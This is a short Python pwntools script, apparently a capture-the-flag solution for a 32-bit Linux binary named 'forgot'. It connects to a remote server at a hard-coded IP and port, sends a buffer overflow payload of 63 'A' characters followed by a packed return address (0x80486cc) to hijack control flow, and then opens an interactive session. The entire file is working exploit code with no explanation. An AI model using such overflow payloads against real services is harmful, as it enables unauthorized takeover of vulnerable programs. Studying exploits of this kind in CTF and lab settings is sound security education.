from pwn import *

context(arch="i386", os="linux", log_level="debug")

# p = process("./forgot")
p = remote("111.198.29.45", 49899)

payload = "A" * 63 + p32(0x80486cc)

p.sendline(payload)
p.interactive()